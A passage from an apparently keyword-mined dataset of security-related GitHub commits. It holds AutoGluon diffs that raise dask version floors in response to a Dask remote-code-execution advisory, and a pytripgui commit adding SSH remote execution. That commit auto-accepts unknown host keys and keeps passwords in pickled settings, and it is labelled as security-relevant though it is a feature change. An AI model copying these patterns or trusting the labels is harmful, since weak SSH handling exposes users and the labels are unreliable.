'scipy', 'scikit-learn', 'pandas', 'tqdm', 'graphviz', 'cython', 'ConfigSpace==0.4.19', 'tornado>=5.0.1', 'requests', 'matplotlib', 'paramiko>=2.4', 'dask>=2.6.0', 'distributed>=2.6.0', 'boto3', 'autograd>=1.3', 'dill>=0.3.3,<1.0', ] extras_require={ 'extra_searchers':[ 'scikit-optimize', ], } tests_require=[ 'pytest', ] for extra_package in['extra_searchers']: tests_require +=extras_require[extra_package] tests_require=list(set(tests_require)) extras_require['tests']=tests_require install_requires=ag.get_dependency_version_ranges(install_requires) if __name__=='__main__': ag.create_version_file(version=version, submodule=submodule) setup_args=ag.default_setup_args(version=version, submodule=submodule) setup( install_requires=install_requires, extras_require=extras_require, entry_points={ 'console_scripts':[ 'agremote=autogluon.core.scheduler.remote.cli:main', ] }, **setup_args, ) ","sourceWithComments":"#!\/usr\/bin\/env python\n###########################\n# This code block is a HACK (!), but is necessary to avoid code duplication. Do NOT alter these lines.\nimport os\nfrom setuptools import setup\nimport importlib.util\nfilepath = os.path.abspath(os.path.dirname(__file__))\nfilepath_import = os.path.join(filepath, '..', 'core', 'src', 'autogluon', 'core', '_setup_utils.py')\nspec = importlib.util.spec_from_file_location(\"ag_min_dependencies\", filepath_import)\nag = importlib.util.module_from_spec(spec)\n# Identical to `from autogluon.core import _setup_utils as ag`, but works without `autogluon.core` being installed.\nspec.loader.exec_module(ag)\n###########################\n\nversion = ag.load_version_file()\nversion = ag.update_version(version, use_file_if_exists=False, create_file=True)\n\nsubmodule = 'core'\ninstall_requires = [\n    # version ranges added in ag.get_dependency_version_ranges()\n    'numpy',\n    'scipy',\n    'scikit-learn',\n    'pandas',\n    'tqdm',\n    'graphviz',\n\n    'cython',  # TODO: Do we need cython here? Why is cython not version capped \/ minned?\n    'ConfigSpace==0.4.19',\n    'tornado>=5.0.1',\n    'requests',\n    'matplotlib',\n    'paramiko>=2.4',\n    'dask>=2.6.0',\n    'distributed>=2.6.0',\n    'boto3',\n    'autograd>=1.3',\n    'dill>=0.3.3,<1.0',\n]\n\nextras_require = {\n    'extra_searchers': [\n        'scikit-optimize',  # Optional due to only being rarely used and due to breaking install in the past\n    ],\n}\n\ntests_require = [\n    'pytest',\n]\nfor extra_package in ['extra_searchers']:\n    tests_require += extras_require[extra_package]\ntests_require = list(set(tests_require))\nextras_require['tests'] = tests_require\n\ninstall_requires = ag.get_dependency_version_ranges(install_requires)\n\nif __name__ == '__main__':\n    ag.create_version_file(version=version, submodule=submodule)\n    setup_args = ag.default_setup_args(version=version, submodule=submodule)\n    setup(\n        install_requires=install_requires,\n        extras_require=extras_require,\n        entry_points={\n            'console_scripts': [\n                'agremote = autogluon.core.scheduler.remote.cli:main',\n            ]\n        },\n        **setup_args,\n    )\n"}},"msg":"[security] SafetyVulnerabilityAdvisory vulnerability_id='42345', advisory='An issue was discovered in Dask (aka python-dask) through 2021.09.1. Single machine Dask clusters started with dask.distributed.LocalCluster or dask.distributed.Client (which defaults to using LocalCluster) would mistakenly configure their respective Dask workers to listen on external interfaces (typically with a randomly selected high port) rather than only on localhost. A Dask cluster created using this method (when running on a machine that has an applicable port exposed) could be used by a sophisticated attacker to achieve remote code execution. (#1385)"}},"https:\/\/github.com\/autogluon\/autogluon":{"9405c070046d06757b12b41c5d6ae51339531d6f":{"url":"https:\/\/api.github.com\/repos\/autogluon\/autogluon\/commits\/9405c070046d06757b12b41c5d6ae51339531d6f","html_url":"https:\/\/github.com\/autogluon\/autogluon\/commit\/9405c070046d06757b12b41c5d6ae51339531d6f","message":"[security] SafetyVulnerabilityAdvisory vulnerability_id='42345', advisory='An issue was discovered in Dask (aka python-dask) through 2021.09.1. Single machine Dask clusters started with dask.distributed.LocalCluster or dask.distributed.Client (which defaults to using LocalCluster) would mistakenly configure their respective Dask workers to listen on external interfaces (typically with a randomly selected high port) rather than only on localhost. A Dask cluster created using this method (when running on a machine that has an applicable port exposed) could be used by a sophisticated attacker to achieve remote code execution. (#1385)","sha":"9405c070046d06757b12b41c5d6ae51339531d6f","keyword":"remote code execution attack","diff":"diff --git a\/core\/setup.py b\/core\/setup.py\nindex 094eb3957ba..43a1a847b3d 100644\n--- a\/core\/setup.py\n+++ b\/core\/setup.py\n@@ -31,8 +31,8 @@\n     'requests',\n     'matplotlib',\n     'paramiko>=2.4',\n-    'dask>=2.6.0',\n-    'distributed>=2.6.0',\n+    'dask>=2021.09.1',\n+    'distributed>=2021.09.1',\n     'boto3',\n     'autograd>=1.3',\n     'dill>=0.3.3,<1.0',\n","files":{"\/core\/setup.py":{"changes":[{"diff":"\n     'requests',\n     'matplotlib',\n     'paramiko>=2.4',\n-    'dask>=2.6.0',\n-    'distributed>=2.6.0',\n+    'dask>=2021.09.1',\n+    'distributed>=2021.09.1',\n     'boto3',\n     'autograd>=1.3',\n     'dill>=0.3.3,<1.0',\n","add":2,"remove":2,"filename":"\/core\/setup.py","badparts":["    'dask>=2.6.0',","    'distributed>=2.6.0',"],"goodparts":["    'dask>=2021.09.1',","    'distributed>=2021.09.1',"]},{"diff":"\n     'requests',\n     'matplotlib',\n     'paramiko>=2.4',\n-    'dask>=2.6.0',\n-    'distributed>=2.6.0',\n+    'dask>=2021.09.1',\n+    'distributed>=2021.09.1',\n     'boto3',\n     'autograd>=1.3',\n     'dill>=0.3.3,<1.0',\n","add":2,"remove":2,"filename":"\/core\/setup.py","badparts":["    'dask>=2.6.0',","    'distributed>=2.6.0',"],"goodparts":["    'dask>=2021.09.1',","    'distributed>=2021.09.1',"]}],"source":"\n import os from setuptools import setup import importlib.util filepath=os.path.abspath(os.path.dirname(__file__)) filepath_import=os.path.join(filepath, '..', 'core', 'src', 'autogluon', 'core', '_setup_utils.py') spec=importlib.util.spec_from_file_location(\"ag_min_dependencies\", filepath_import) ag=importlib.util.module_from_spec(spec) spec.loader.exec_module(ag) version=ag.load_version_file() version=ag.update_version(version, use_file_if_exists=False, create_file=True) submodule='core' install_requires=[ 'numpy', 'scipy', 'scikit-learn', 'pandas', 'tqdm', 'graphviz', 'cython', 'ConfigSpace==0.4.19', 'tornado>=5.0.1', 'requests', 'matplotlib', 'paramiko>=2.4', 'dask>=2.6.0', 'distributed>=2.6.0', 'boto3', 'autograd>=1.3', 'dill>=0.3.3,<1.0', ] extras_require={ 'extra_searchers':[ 'scikit-optimize', ], } tests_require=[ 'pytest', ] for extra_package in['extra_searchers']: tests_require +=extras_require[extra_package] tests_require=list(set(tests_require)) extras_require['tests']=tests_require install_requires=ag.get_dependency_version_ranges(install_requires) if __name__=='__main__': ag.create_version_file(version=version, submodule=submodule) setup_args=ag.default_setup_args(version=version, submodule=submodule) setup( install_requires=install_requires, extras_require=extras_require, entry_points={ 'console_scripts':[ 'agremote=autogluon.core.scheduler.remote.cli:main', ] }, **setup_args, ) ","sourceWithComments":"#!\/usr\/bin\/env python\n###########################\n# This code block is a HACK (!), but is necessary to avoid code duplication. Do NOT alter these lines.\nimport os\nfrom setuptools import setup\nimport importlib.util\nfilepath = os.path.abspath(os.path.dirname(__file__))\nfilepath_import = os.path.join(filepath, '..', 'core', 'src', 'autogluon', 'core', '_setup_utils.py')\nspec = importlib.util.spec_from_file_location(\"ag_min_dependencies\", filepath_import)\nag = importlib.util.module_from_spec(spec)\n# Identical to `from autogluon.core import _setup_utils as ag`, but works without `autogluon.core` being installed.\nspec.loader.exec_module(ag)\n###########################\n\nversion = ag.load_version_file()\nversion = ag.update_version(version, use_file_if_exists=False, create_file=True)\n\nsubmodule = 'core'\ninstall_requires = [\n    # version ranges added in ag.get_dependency_version_ranges()\n    'numpy',\n    'scipy',\n    'scikit-learn',\n    'pandas',\n    'tqdm',\n    'graphviz',\n\n    'cython',  # TODO: Do we need cython here? Why is cython not version capped \/ minned?\n    'ConfigSpace==0.4.19',\n    'tornado>=5.0.1',\n    'requests',\n    'matplotlib',\n    'paramiko>=2.4',\n    'dask>=2.6.0',\n    'distributed>=2.6.0',\n    'boto3',\n    'autograd>=1.3',\n    'dill>=0.3.3,<1.0',\n]\n\nextras_require = {\n    'extra_searchers': [\n        'scikit-optimize',  # Optional due to only being rarely used and due to breaking install in the past\n    ],\n}\n\ntests_require = [\n    'pytest',\n]\nfor extra_package in ['extra_searchers']:\n    tests_require += extras_require[extra_package]\ntests_require = list(set(tests_require))\nextras_require['tests'] = tests_require\n\ninstall_requires = ag.get_dependency_version_ranges(install_requires)\n\nif __name__ == '__main__':\n    ag.create_version_file(version=version, submodule=submodule)\n    setup_args = ag.default_setup_args(version=version, submodule=submodule)\n    setup(\n        install_requires=install_requires,\n        extras_require=extras_require,\n        entry_points={\n            'console_scripts': [\n                'agremote = autogluon.core.scheduler.remote.cli:main',\n            ]\n        },\n        **setup_args,\n    )\n"}},"msg":"[security] SafetyVulnerabilityAdvisory vulnerability_id='42345', advisory='An issue was discovered in Dask (aka python-dask) through 2021.09.1. Single machine Dask clusters started with dask.distributed.LocalCluster or dask.distributed.Client (which defaults to using LocalCluster) would mistakenly configure their respective Dask workers to listen on external interfaces (typically with a randomly selected high port) rather than only on localhost. A Dask cluster created using this method (when running on a machine that has an applicable port exposed) could be used by a sophisticated attacker to achieve remote code execution. (#1385)"}},"https:\/\/github.com\/pytrip\/pytripgui":{"4ef79984520f09228aa90e5f456ef7e10ca17dc4":{"url":"https:\/\/api.github.com\/repos\/pytrip\/pytripgui\/commits\/4ef79984520f09228aa90e5f456ef7e10ca17dc4","html_url":"https:\/\/github.com\/pytrip\/pytripgui\/commit\/4ef79984520f09228aa90e5f456ef7e10ca17dc4","message":"WIP: Feature\/234 execute trip remotely (#357)\n\n* initial\r\n\r\n* Adding \"hostname, username, pass\" to tripconfig\r\n\r\n* Enchance trip_config fields\r\n\r\n* Mark ui as private\r\n\r\n* Hardcoded execution of first config on trip config list works\r\n\r\n* simple test repair\r\n\r\n* Remove debug print\r\n\r\n* Cleaning code\r\n\r\n* Format code with yapf\r\n\r\n* Selecting trip config\r\n\r\n* Format code with yapf\r\n\r\n* Replace hardcoded path\r\n\r\n* Repairs \"IndexError: list index out of range\" mentioned in Merge Request\r\n\r\n* Format code with yapf\r\n\r\n* If list is empty, then you cannot save settings\r\n\r\n* Disable unimplemented features\r\n\r\n* 1. Logging with private key works (pass protected and not)\r\n2. Add \"Remote\/Local\" Path info\r\n3. Add Remote TRIP path\r\n4. Shows errors more verbosely to user\r\n\r\n* remove test script used for development\r\n\r\n* Format code with yapf\r\n\r\n* fix: problem with paths\r\n\r\nCo-authored-by: ljelen <lukasz.jelen@ifj.edu.pl>\r\nCo-authored-by: deepsource-autofix[bot] <62050782+deepsource-autofix[bot]@users.noreply.github.com>","sha":"4ef79984520f09228aa90e5f456ef7e10ca17dc4","keyword":"remote code execution protect","diff":"diff --git a\/pytripgui\/app_logic\/app_callbacks.py b\/pytripgui\/app_logic\/app_callbacks.py\nindex dc51feea..dbcb3a50 100644\n--- a\/pytripgui\/app_logic\/app_callbacks.py\n+++ b\/pytripgui\/app_logic\/app_callbacks.py\n@@ -13,11 +13,13 @@\n from pytripgui.app_logic.gui_executor import GuiExecutor\n \n from pytripgui.view.qt_gui import UiAddPatient\n+from pytripgui.view.execute_config_view import ExecuteConfigView\n \n from pytripgui.controller.settings_cont import SettingsController\n \n import os\n import logging\n+\n logger = logging.getLogger(__name__)\n \n \n@@ -51,7 +53,13 @@ def on_execute_selected_plan(self):\n \n         patient = self.app_model.patient_tree.selected_item_patient()\n \n-        executor = GuiExecutor(self.app_model.trip_config, patient, plan,\n+        trip_config = ExecuteConfigView(self.app_model.trip_configs,\n+                                        self.parent_gui.ui)\n+        trip_config.show()\n+        if not trip_config.config:\n+            return\n+\n+        executor = GuiExecutor(trip_config.config, patient, plan,\n                                self._execute_finish_callback,\n                                self.parent_gui.ui)\n \n@@ -91,14 +99,15 @@ def on_trip98_config(self):\n         logger.debug(\"TRiP config menu()\")\n \n         from pytripgui.config_vc import ConfigController\n-\n         view = self.parent_gui.get_trip_config_view()\n \n-        controller = ConfigController(self.app_model.trip_config, view)\n+        config = self.app_model.trip_configs\n+        controller = ConfigController(config, view)\n         controller.set_view_from_model()\n         view.show()\n \n         if controller.user_clicked_save:\n+            self.app_model.trip_configs = controller.model\n             self.settings.save()\n \n     def on_add_patient(self):\ndiff --git a\/pytripgui\/config_vc\/config_cont.py b\/pytripgui\/config_vc\/config_cont.py\nindex d522691d..0c9290cd 100644\n--- a\/pytripgui\/config_vc\/config_cont.py\n+++ b\/pytripgui\/config_vc\/config_cont.py\n@@ -1,4 +1,8 @@\n+from pytripgui.plan_executor.trip_config import Trip98ConfigModel\n+from paramiko import ssh_exception\n+\n import logging\n+\n logger = logging.getLogger(__name__)\n \n \n@@ -7,28 +11,104 @@ def __init__(self, model, view):\n         self.model = model\n         self.view = view\n         self.user_clicked_save = False\n-        self._setup_ok_and_cancel_buttons_callbacks()\n+        self._setup_callbacks()\n+\n+        self.view.test_ssh_clicked_callback_connect(self._test_ssh)\n \n-    def _setup_ok_and_cancel_buttons_callbacks(self):\n+        if not self.model:\n+            self.model = [Trip98ConfigModel()]\n+\n+    def _setup_callbacks(self):\n         self.view.set_ok_callback(self._save_and_exit)\n         self.view.set_cancel_callback(self._exit)\n \n+        self.view.add_button.emit_on_click(\n+            lambda: self.view.configs.append_element(Trip98ConfigModel(), \"\"))\n+        self.view.remove_button.emit_on_click(\n+            self.view.configs.remove_current_item)\n+\n     def _save_and_exit(self):\n-        self.set_model_from_view()\n         self.user_clicked_save = True\n-        self.view.exit()\n+        self.model = self.view.configs.data\n+        self._exit()\n \n     def _exit(self):\n+        if self.view.configs.count:\n+            self._set_model_from_view()\n         self.view.exit()\n \n     def set_view_from_model(self):\n-        self.view.wdir_path = self.model.wdir_path\n-        self.view.trip_path = self.model.trip_path\n-        self.view.hlut_path = self.model.hlut_path\n-        self.view.dedx_path = self.model.dedx_path\n-\n-    def set_model_from_view(self):\n-        self.model.wdir_path = self.view.wdir_path\n-        self.model.trip_path = self.view.trip_path\n-        self.model.hlut_path = self.view.hlut_path\n-        self.model.dedx_path = self.view.dedx_path\n+        self.view.configs.fill(self.model, lambda item: item.name)\n+        self.view.configs.emit_on_item_change(self._on_item_change_callback)\n+        self._set_current_config()\n+\n+    def _on_item_change_callback(self):\n+        self._set_model_from_view()\n+        self._set_current_config()\n+\n+    def _set_current_config(self):\n+        config = self.view.configs.current_data\n+\n+        self.view.remote_execution = config.remote_execution\n+        self.view.name.text = config.name\n+        self.view.wdir_path.text = config.wdir_path\n+        self.view.trip_path.text = config.trip_path\n+        self.view.hlut_path.text = config.hlut_path\n+        self.view.dedx_path.text = config.dedx_path\n+        self.view.host_name.text = config.host_name\n+        self.view.user_name.text = config.user_name\n+        self.view.pkey_path.text = config.pkey_path\n+        self.view.password.text = config.password\n+        self.view.wdir_remote_path.text = config.wdir_remote_path\n+\n+    def _set_model_from_view(self):\n+        config = self.view.configs.last_data\n+\n+        # after you delete config, there is nothing in last_data\n+        if not config:\n+            return\n+\n+        config.remote_execution = self.view.remote_execution\n+        config.name = self.view.name.text\n+        config.wdir_path = self.view.wdir_path.text\n+        config.trip_path = self.view.trip_path.text\n+        config.hlut_path = self.view.hlut_path.text\n+        config.dedx_path = self.view.dedx_path.text\n+        config.host_name = self.view.host_name.text\n+        config.user_name = self.view.user_name.text\n+        config.pkey_path = self.view.pkey_path.text\n+        config.password = self.view.password.text\n+        config.wdir_remote_path = self.view.wdir_remote_path.text\n+\n+    def _test_ssh(self):\n+        import paramiko\n+        ssh = paramiko.SSHClient()\n+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n+\n+        key_path = None\n+        if self.view.pkey_path.text:\n+            key_path = self.view.pkey_path.text\n+\n+        try:\n+            ssh.connect(hostname=self.view.host_name.text,\n+                        username=self.view.user_name.text,\n+                        password=self.view.password.text,\n+                        key_filename=key_path)\n+        except ssh_exception.AuthenticationException as e:\n+            self.view.info_box.show_error(\"Authentication\", e.__str__())\n+        except FileNotFoundError as e:\n+            self.view.info_box.show_error(\"File not found\", e.__str__())\n+        except ValueError as e:\n+            self.view.info_box.show_error(\"Value\", e.__str__())\n+        else:\n+\n+            sftp = ssh.open_sftp()\n+            try:\n+                sftp.stat(self.view.wdir_remote_path.text)\n+            except FileNotFoundError as e:\n+                self.view.info_box.show_error(\n+                    \"File not found\", \"Remote working directory doesn't exist\")\n+            else:\n+                self.view.info_box.show_info(\"SSH Connection\", \"Everything OK\")\n+\n+        ssh.close()\ndiff --git a\/pytripgui\/config_vc\/config_view.py b\/pytripgui\/config_vc\/config_view.py\nindex 426a4348..9d058d76 100644\n--- a\/pytripgui\/config_vc\/config_view.py\n+++ b\/pytripgui\/config_vc\/config_view.py\n@@ -1,124 +1,132 @@\n+from pytripgui.view.qt_view_adapter import LineEdit, ComboBox, UserInfoBox, PushButton\n from pytripgui.view.qt_gui import UiTripConfig\n from PyQt5.QtWidgets import QFileDialog\n \n import logging\n+\n logger = logging.getLogger(__name__)\n \n \n class ConfigQtView(object):\n+    stackedWidget_local_index = 0\n+    stackedWidget_remote_index = 1\n     \"\"\"\n     \"\"\"\n     def __init__(self):\n-        self.ui = UiTripConfig()\n+        self._ui = UiTripConfig()\n+\n+        self.name = LineEdit(self._ui.configName_lineEdit)\n+        self.user_name = LineEdit(self._ui.username_lineEdit)\n+        self.pkey_path = LineEdit(self._ui.pkey_lineEdit)\n+        self.password = LineEdit(self._ui.password_lineEdit)\n+        self.host_name = LineEdit(self._ui.host_lineEdit)\n+        self.dedx_path = LineEdit(self._ui.dedx_lineEdit)\n+        self.hlut_path = LineEdit(self._ui.hlut_lineEdit)\n+        self.wdir_path = LineEdit(self._ui.wdirPath_lineEdit)\n+        self.trip_path = LineEdit(self._ui.tripPath_lineEdit)\n+\n+        self.add_button = PushButton(self._ui.add_pushButton)\n+        self.remove_button = PushButton(self._ui.remove_pushButton)\n+\n+        self.wdir_remote_path = LineEdit(self._ui.wdirRemote_lineEdit)\n+\n+        self.configs = ComboBox(self._ui.configs_comboBox)\n+\n+        self.info_box = UserInfoBox(self._ui)\n \n         self._setup_internal_callbacks()\n-        self._disable_unimplemented()\n+        self._ui.local_radioButton.clicked.emit()\n+\n+        self.name.emit_on_text_change(\n+            lambda text: self.configs.set_current_item_text(text))\n+\n+    def test_ssh_clicked_callback_connect(self, callback):\n+        self._ui.testSsh_pushButton.clicked.connect(callback)\n \n     def _setup_internal_callbacks(self):\n-        self.ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)\n-        self.ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)\n-        self.ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)\n-        self.ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)\n+        self._ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)\n+        self._ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)\n+        self._ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)\n+        self._ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)\n+        self._ui.pKey_pushButton.clicked.connect(self._browse_pkey_path)\n+\n+        self._ui.local_radioButton.clicked.connect(\n+            self._on_local_radio_button_click)\n+        self._ui.remote_radioButton.clicked.connect(\n+            self._on_remote_radio_button_click)\n \n     def _browse_wdir(self):\n         selected_dir = QFileDialog.getExistingDirectory(\n-            self.ui,\n-            \"Select working directory\",\n-            self.wdir_path,\n+            self._ui, \"Select working directory\", self.wdir_path.text,\n             QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks)\n         if selected_dir != \"\":\n-            self.wdir_path = selected_dir\n+            self.wdir_path.text = selected_dir\n \n     def _browse_trip_path(self):\n         selected_dir = QFileDialog.getExistingDirectory(\n-            self.ui,\n-            \"Select trip executable directory\",\n-            self.trip_path,\n+            self._ui, \"Select trip executable directory\", self.trip_path.text,\n             QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks)\n         if selected_dir != \"\":\n-            self.trip_path = selected_dir\n+            self.trip_path.text = selected_dir\n \n     def _browse_hlut_path(self):\n         selected_file = QFileDialog.getOpenFileName(\n-            self.ui,\n-            \"Select HLUT\",\n-            self.hlut_path,\n+            self._ui, \"Select HLUT\", self.hlut_path.text,\n             \"Hounsfield lookup table (*.hlut)\")\n         if selected_file[0] != \"\":\n-            self.hlut_path = selected_file[0]\n+            self.hlut_path.text = selected_file[0]\n \n     def _browse_dedx_path(self):\n         selected_file = QFileDialog.getOpenFileName(\n-            self.ui,\n-            \"Select DEDX\",\n-            self.dedx_path,\n+            self._ui, \"Select DEDX\", self.dedx_path.text,\n             \"Stopping power table (*.dedx)\")\n         if selected_file[0] != \"\":\n             print(selected_file)\n-            self.dedx_path = selected_file[0]\n+            self.dedx_path.text = selected_file[0]\n \n-    def _disable_unimplemented(self):\n-        self.ui.tripAccess_comboBox.setDisabled(True)\n-        self.ui.remote_tab.setDisabled(True)\n-        self.ui.tab_test.setDisabled(True)\n+    def _browse_pkey_path(self):\n+        selected_file = QFileDialog.getOpenFileName(\n+            self._ui, \"Select private key for SSH connection\",\n+            self.pkey_path.text, \"Private key (*)\")\n+        if selected_file[0] != \"\":\n+            self.pkey_path.text = selected_file[0]\n+\n+    def _on_local_radio_button_click(self):\n+        self._ui.local_radioButton.setChecked(True)\n+        self._ui.tripPath_pushButton.setVisible(True)\n+        self._ui.hlut_pushButton.setVisible(True)\n+        self._ui.dedx_pushButton.setVisible(True)\n+        self._ui.ssh_GroupBox.setEnabled(False)\n+        self._ui.remoteLocal_groupBox.setTitle(\"Local paths\")\n+\n+    def _on_remote_radio_button_click(self):\n+        self._ui.remote_radioButton.setChecked(True)\n+        self._ui.tripPath_pushButton.setVisible(False)\n+        self._ui.hlut_pushButton.setVisible(False)\n+        self._ui.dedx_pushButton.setVisible(False)\n+        self._ui.ssh_GroupBox.setEnabled(True)\n+        self._ui.remoteLocal_groupBox.setTitle(\"Remote paths\")\n \n     def show(self):\n-        self.ui.show()\n-        self.ui.exec_()\n+        self._ui.show()\n+        self._ui.exec_()\n \n     def exit(self):\n-        self.ui.close()\n+        self._ui.close()\n \n     def set_ok_callback(self, fun):\n-        self.ui.accept_buttonBox.accepted.connect(fun)\n+        self._ui.accept_buttonBox.accepted.connect(fun)\n \n     def set_cancel_callback(self, fun):\n-        self.ui.accept_buttonBox.rejected.connect(fun)\n+        self._ui.accept_buttonBox.rejected.connect(fun)\n \n     @property\n-    def wdir_path(self):\n-        return self.ui.wdirPath_lineEdit.text()\n-\n-    @wdir_path.getter\n-    def wdir_path(self):\n-        return self.ui.wdirPath_lineEdit.text()\n-\n-    @wdir_path.setter\n-    def wdir_path(self, wdir_path):\n-        self.ui.wdirPath_lineEdit.setText(wdir_path)\n-\n-    @property\n-    def trip_path(self):\n-        return self.ui.tripPath_lineEdit.text()\n-\n-    @trip_path.getter\n-    def trip_path(self):\n-        return self.ui.tripPath_lineEdit.text()\n-\n-    @trip_path.setter\n-    def trip_path(self, trip_path):\n-        self.ui.tripPath_lineEdit.setText(trip_path)\n-\n-    @property\n-    def hlut_path(self):\n-        return self.ui.hlut_lineEdit.text()\n-\n-    @hlut_path.getter\n-    def hlut_path(self):\n-        return self.ui.hlut_lineEdit.text()\n-\n-    @hlut_path.setter\n-    def hlut_path(self, hlut_path):\n-        self.ui.hlut_lineEdit.setText(hlut_path)\n-\n-    @property\n-    def dedx_path(self):\n-        return self.ui.dedx_lineEdit.text()\n-\n-    @dedx_path.getter\n-    def dedx_path(self):\n-        return self.ui.dedx_lineEdit.text()\n-\n-    @dedx_path.setter\n-    def dedx_path(self, dedx_path):\n-        self.ui.dedx_lineEdit.setText(dedx_path)\n+    def remote_execution(self):\n+        return self._ui.remote_radioButton.isChecked()\n+\n+    @remote_execution.setter\n+    def remote_execution(self, remote_execution):\n+        if remote_execution:\n+            self._ui.remote_radioButton.clicked.emit()\n+        else:\n+            self._ui.local_radioButton.clicked.emit()\ndiff --git a\/pytripgui\/model\/main_model.py b\/pytripgui\/model\/main_model.py\nindex f53ab1d5..5d026623 100644\n--- a\/pytripgui\/model\/main_model.py\n+++ b\/pytripgui\/model\/main_model.py\n@@ -14,13 +14,11 @@ def __init__(self):\n         self._pytrip_version = _pytrip_version\n         self._pytripgui_version = _pytripgui_version\n \n-        self.trip_config = Trip98ConfigModel()\n+        self.trip_configs = []\n         self.kernels = []  # placeholder for KernelModels\n \n         self.viewcanvases = None\n         self.patient_tree = None\n-        self.settings = None\n-\n         self.settings = SettingsModel(self)\n \n \n@@ -31,7 +29,6 @@ class SettingsModel(object):\n     Model attribute names with leading _ are saved, but not loaded.\n     Model attribute names with leading __ are not saved and not loaded.\n     \"\"\"\n-\n     def __init__(self, model):\n         \"\"\"\n         This object is pickled upon save and unpickled upon load.\n@@ -43,7 +40,7 @@ def __init__(self, model):\n             a) _version is written to disk, but imported into Model when loading\n             b) __internal_attribute__ are not passed between Model and SettingsModel\n         \"\"\"\n-        self.trip_config = model.trip_config\n+        self.trip_configs = model.trip_configs\n \n         self.kernels = model.kernels\n \ndiff --git a\/pytripgui\/plan_executor\/executor.py b\/pytripgui\/plan_executor\/executor.py\nindex ba8dc5ea..ead7d0a3 100644\n--- a\/pytripgui\/plan_executor\/executor.py\n+++ b\/pytripgui\/plan_executor\/executor.py\n@@ -1,4 +1,3 @@\n-import os\n import copy\n import logging\n \n@@ -29,14 +28,25 @@ def execute(self, patient, plan):\n         plan.hlut_path = self.trip_config.hlut_path\n \n         te = pte.Execute(patient.ctx, patient.vdx)\n-        te.trip_bin_path = os.path.join(self.trip_config.trip_path, 'TRiP98')\n+        if self.trip_config.remote_execution:\n+            te.remote = True\n+            te.servername = self.trip_config.host_name\n+            te.username = self.trip_config.user_name\n+            te.password = self.trip_config.password\n+            print(self.trip_config.pkey_path)\n+            te.pkey_path = self.trip_config.pkey_path\n+            te.remote_base_dir = self.trip_config.wdir_remote_path + '\/'\n+\n+        te.trip_bin_path = self.trip_config.trip_path + '\/' + 'TRiP98'\n+\n         if self.listener:\n             te.add_log_listener(self.listener)\n \n         try:\n             te.execute(plan)\n-        except RuntimeError:\n-            logger.error(\"TRiP98 executer: Runtime error\")\n+        except BaseException as e:\n+            self.listener.write(e.__str__())\n+            logger.error(e.__str__())\n             exit(-1)\n \n         results = SimulationResults(patient, plan)\ndiff --git a\/pytripgui\/plan_executor\/trip_config.py b\/pytripgui\/plan_executor\/trip_config.py\nindex 777ec102..bba042ad 100644\n--- a\/pytripgui\/plan_executor\/trip_config.py\n+++ b\/pytripgui\/plan_executor\/trip_config.py\n@@ -1,6 +1,15 @@\n class Trip98ConfigModel:\n     def __init__(self):\n-        self.wdir_path = \"\"\n-        self.trip_path = \"\"\n+        self.name = \"\"\n+        self.remote_execution = False\n         self.hlut_path = \"\"\n         self.dedx_path = \"\"\n+        self.wdir_path = \"\"\n+        self.trip_path = \"\"\n+\n+        # remote execution\n+        self.host_name = \"\"\n+        self.user_name = \"\"\n+        self.pkey_path = \"\"\n+        self.password = \"\"\n+        self.wdir_remote_path = \"\"\ndiff --git a\/pytripgui\/view\/chart_widget.py b\/pytripgui\/view\/chart_widget.py\nindex e2e83dd2..0b5ec906 100644\n--- a\/pytripgui\/view\/chart_widget.py\n+++ b\/pytripgui\/view\/chart_widget.py\n@@ -1,3 +1,4 @@\n+# from PyQt5 import QtChart\n from PyQt5.QtChart import QChart, QChartView, QLineSeries\n from PyQt5.QtGui import QPainter\n from PyQt5.QtCore import Qt\ndiff --git a\/pytripgui\/view\/execute_config.ui b\/pytripgui\/view\/execute_config.ui\nnew file mode 100644\nindex 00000000..fc752dbb\n--- \/dev\/null\n+++ b\/pytripgui\/view\/execute_config.ui\n@@ -0,0 +1,47 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<ui version=\"4.0\">\n+ <class>tripConfig<\/class>\n+ <widget class=\"QDialog\" name=\"tripConfig\">\n+  <property name=\"geometry\">\n+   <rect>\n+    <x>0<\/x>\n+    <y>0<\/y>\n+    <width>459<\/width>\n+    <height>118<\/height>\n+   <\/rect>\n+  <\/property>\n+  <property name=\"windowTitle\">\n+   <string>TRiP98 Configuration<\/string>\n+  <\/property>\n+  <layout class=\"QVBoxLayout\" name=\"verticalLayout\">\n+   <item>\n+    <widget class=\"QGroupBox\" name=\"configs\">\n+     <property name=\"title\">\n+      <string>Execute on<\/string>\n+     <\/property>\n+     <layout class=\"QVBoxLayout\" name=\"verticalLayout_5\">\n+      <item>\n+       <widget class=\"QComboBox\" name=\"configs_comboBox\">\n+        <property name=\"enabled\">\n+         <bool>true<\/bool>\n+        <\/property>\n+       <\/widget>\n+      <\/item>\n+     <\/layout>\n+    <\/widget>\n+   <\/item>\n+   <item>\n+    <widget class=\"QDialogButtonBox\" name=\"accept_buttonBox\">\n+     <property name=\"standardButtons\">\n+      <set>QDialogButtonBox::Abort|QDialogButtonBox::Ok<\/set>\n+     <\/property>\n+     <property name=\"centerButtons\">\n+      <bool>false<\/bool>\n+     <\/property>\n+    <\/widget>\n+   <\/item>\n+  <\/layout>\n+ <\/widget>\n+ <resources\/>\n+ <connections\/>\n+<\/ui>\ndiff --git a\/pytripgui\/view\/execute_config_view.py b\/pytripgui\/view\/execute_config_view.py\nnew file mode 100644\nindex 00000000..7bf5b62e\n--- \/dev\/null\n+++ b\/pytripgui\/view\/execute_config_view.py\n@@ -0,0 +1,33 @@\n+from pytripgui.view.qt_gui import UiExecuteConfigDialog\n+from pytripgui.view.qt_view_adapter import ComboBox\n+\n+\n+class ExecuteConfigView(object):\n+    def __init__(self, model, ui):\n+        self._ui = UiExecuteConfigDialog(ui)\n+        self.config = None\n+\n+        self._configs = ComboBox(self._ui.configs_comboBox)\n+        self._configs.fill(model, lambda config: config.name)\n+        